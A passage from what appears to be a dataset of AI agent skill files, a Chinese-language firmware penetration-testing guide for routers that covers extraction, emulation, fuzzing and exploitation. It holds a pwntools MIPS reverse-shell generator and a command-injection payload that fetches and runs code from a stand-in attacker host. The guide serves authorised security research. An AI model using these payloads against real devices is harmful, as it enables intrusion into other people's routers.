    \ -ex \"target remote :1234\"\n\n# Burp + 路由 Web UI\necho \"把 Firmadyne 仿真出来的 IP 设为 Burp upstream\
    \ proxy 目标\"\n```\n\n### Stage 8 — 运行时分析（Runtime Analysis）\n\n在真实硬件上挂调试器，或者仿真态做覆盖率制导 fuzz。\n\n```bash\n\
    # AFL++ qemu mode 对 ARM / MIPS binary fuzz\nAFL_PRELOAD=./libdesock.so afl-fuzz -Q -i in/ -o out/\
    \ -- ./httpd @@\n```\n\n### Stage 9 — 二进制利用（Exploitation）\n\n写 PoC，生成 payload，落地 root shell。\n\n```bash\n\
    # pwntools 生成 MIPS reverse shell\npython3 -c \"\nfrom pwn import *\ncontext.arch = 'mips'\ncontext.endian\
    \ = 'little'\nprint(shellcraft.connect('192.168.1.100', 4444) + shellcraft.dupsh())\n\" | as -EL -mips32\
    \ -o sc.o - && objcopy -O binary sc.o sc.bin\n\n# ROP gadget\nropper --file squashfs-root/usr/sbin/httpd\
    \ --search \"system\"\n```\n\n## 典型场景示例\n\n### 场景 1：普通路由器固件全链路（TP-Link / 小米路由器 / OpenWrt 衍生）\n\n```text\n\
    固件: router_v1.2.3.bin（未加密 squashfs）\n目标: 找 Web 管理界面未授权 RCE 并复现\n\nStep 1 信息收集\n  - FCC ID 反查 → MT7621\
    \ + MT7615 + 16MB flash\n  - 已公开 CVE：CVE-2023-xxxxx（chk 头校验缺陷）\n\nStep 2 获取固件\n  - 官网下载 .bin，sha256\
    \ 与已知样本对比\n\nStep 3 分析\n  - binwalk → 检出 uImage + squashfs-xz\n  - 熵图 → squashfs 段熵 ~0.95（正常压缩）\n\n\
    Step 4 提取\n  - binwalk -eM router_v1.2.3.bin\n  - 得到 squashfs-root/ 完整根文件系统\n\nStep 5 EMBA 扫\n  -\
    \ 报告里高危：lighttpd 1.4.45（CVE-2018-19052）+ busybox 1.27.2 多 CVE\n  - 自家二进制：/usr/sbin/cgibin 含 system()\
    \ 直拼字符串\n\nStep 6 仿真\n  - sudo fat.py router_v1.2.3.bin\n  - 仿真起来 IP 192.168.0.1，Web 可访问\n\nStep 7-8\
    \ 动态\n  - Burp 抓 /cgi-bin/luci 系列接口\n  - 发现 hostname 参数直拼 system\n\nStep 9 利用\n  - 构造 hostname=`;wget\
    \ http://attacker/x;sh x;`\n  - 仿真态成功反弹 shell\n  - 真机复测通过 → 提报 SRC\n```\n\n### 场景 2：加密固件（找 bootloader\
    \ 解密例程）\n\n```text\n固件: encrypted_fw.bin（binwalk 全空白 + 熵 ~0.99）\n\nStep 1 判断是否真加密\n  - 熵全段 ~0.99 且无任何\
    \ magic → 大概率加密或纯压缩\n  - 头部前 256 字节 hexdump → 看是否有 vendor header\n\nStep 2 拿到 bootloader\n  - UART\
    \ 启动时按键进 U-Boot\n  - md.b 0x80000000 0x1000   # 读内存\n  - 或 SPI flash 物理读取整片 → 含 U-Boot 段\n\nStep 3\
    \ 逆 U-Boot 找解密例程\n  - 用 reverse-engineering skill（IDA / Ghidra）\n  - 入口 board_init_r → 找 do_bootm\
    \ 前的 image_decrypt\n  - 通常是 AES-128-CBC，key 硬编在 .rodata\n\nStep 4 离线解密\n  openssl enc -d -aes-128-cbc\
    \ \\\n    -K $(cat key.hex) \\\n    -iv  $(cat iv.hex) \\\n    -in encrypted_fw.bin \\\n    -out decrypted.bin\n\
    \nStep 5 回到 Stage 4 重新走标准流程\n  - binwalk decrypted.bin → 看到 squashfs\n  - 后续与场景 1 相同\n\n兜底\n  - bootloader\
    \ 也加密 → 找 SoC 一级 ROM 文档\n  - SoC 有安全启动 → 看公开 fault injection / glitch 资料\n```\n\n## 注意事项\n\n- **大小端**：MIPS\
    \ 路由器常见 mipsel（小端，MT 系列）/ mipseb（大端，Broadcom 系列），qemu binary 别用错\n- **NVRAM**：仿真起来 httpd 立即崩 → 90%\
    \ 是 nvram_get 拿不到值，Firmadyne 有 libnvram hook，FAT 默认带\n- **EMBA 不是银弹**：跑出来一堆 CVE 别全信，要核对版本字符串和实际利用条件\n\
    - **AFL++ qemu mode 慢**：先用 afl-clang-lto 重编译目标（如果有源码），快 5-10 倍\n- **真机操作前先 dump**：物理设备砖前必备整片 flash\
    \ dump，用 flashrom / ch341a / minipro\n- **法律边界**：自家设备、SRC 授权、CTF、公开靶机才能搞，企业生产设备需要书面授权\n- **field-journal\
    \ 回写**：每完成一个固件，记录芯片型号、SDK、binwalk 是否成功、仿真是否成功，下次同系列直接复用\n\n---\n\n## 按需自举（On-Demand Bootstrap）\n\n\
    ### 工具清单\n\n| 工具 | 用途 | 自动安装 |\n|------|------|---------|\n| binwalk v3 | 主提取（Rust 重写版） | ✓ |\n| binwalk\
    \ v2 | 兼容老插件 | ✓ |\n| unblob | 兜底提取 | ✓ |\n| jefferson | JFFS2 提取 | ✓ |\n| ubi_reader | UBI / UBIFS\
    \ 提取 | ✓ |\n| EMBA | 自动化分析框架 | ✓ |\n| Firmadyne | 全系统仿真 | ✓ |\n| FAT (Firmware Analysis Toolkit) |\
    \ Firmadyne 封装 | ✓ |\n| qemu-user-static | 用户态仿真 | ✓ |\n| qemu-system-* | 全系统仿真 | ✓ |\n| AFL++ | 模糊测试\
    \ | ✓ |\n| pwntools | 漏洞利用脚本 | ✓ |\n| flashrom | SPI flash 读写 | ✓ |\n| picocom | UART 串口 | ✓ |\n\n\
    ### 安装命令\n\n```bash\n# Debian / Ubuntu 一把梭\nsudo apt update && sudo apt install -y \\\n  binwalk python3-pip\
    \ qemu-user-static qemu-system-mips qemu-system-arm \\\n  gdb-multiarch picocom flashrom build-essential\
    \ libssl-dev\n\n# binwalk v3（Rust 版）\ncargo install binwalk\n\n# Python 系列工具\npip3 install --user\
    \ unblob jefferson ubi_reader pwntools\n\n# EMBA\ngit clone https://github.com/e-m-b-a/emba.git ~/tools/emba\n\
    cd ~/tools/emba && sudo ./installer.sh -d\n\n# Firmadyne\ngit clone --recursive https://github.com/firmadyne/firmadyne.git\
    \ ~/tools/firmadyne\ncd ~/tools/firmadyne && sudo ./download.sh\n\n# FAT\ngit clone https://github.com/attify/firmware-analysis-toolkit.git\
    \ ~/tools/fat\n\n# AFL++\ngit clone https://github.com/AFLplusplus/AFLplusplus ~/tools/aflpp\ncd ~/tools/aflpp\
    \ && make distrib && sudo make install\n```\n\n### Windows 用户\n\n固件渗透链强依赖 Linux 工具，建议：\n- WSL2 Ubuntu\
    \ 22.04（足够大多数场景）\n- 或独立 Kali / Ubuntu 虚拟机\n- EMBA 必须 Linux，Firmadyne / FAT 必须 Linux\n\n---\n\n## 路由上下文\n\
    \n**上游入口**: `skills/SKILL.md`（总控）、`routing.md`\n**触发条件**: 任务涉及固件文件、IoT 设备、嵌入式漏洞挖掘、路由器审计\n**下游出口**:\n\
    - 单个二进制深度静态分析 → `reverse-engineering/`、`ida-reverse/`、`radare2/`\n- 仿真起来后做 Web RCE / 后渗透 → `pentest-tools/`、`attack-chain/`\n\
    - 跨版本固件符号迁移 → `binary-diff/`\n- 硬件接口实操参考 → `patterns-hardware.md`\n- APK / boot.img 处理 → `apk-reverse/`\n\
    \n**同级关联**: `pentest-tools/`（Web 利用阶段配合）、`attack-chain/`（跨阶段攻击链规划）\n\n**参考文档**:\n- `references/extraction-methodology.md`\
    \ — 提取细节与失败兜底\n- `references/emba-automated-analysis.md` — EMBA 全流程\n- `references/emulation-and-fuzz.md`\
    \ — 仿真 + fuzz 实战"
  source: firmware-pentest
  path: firmware-pentest/SKILL.md
- skill_id: game-hacking
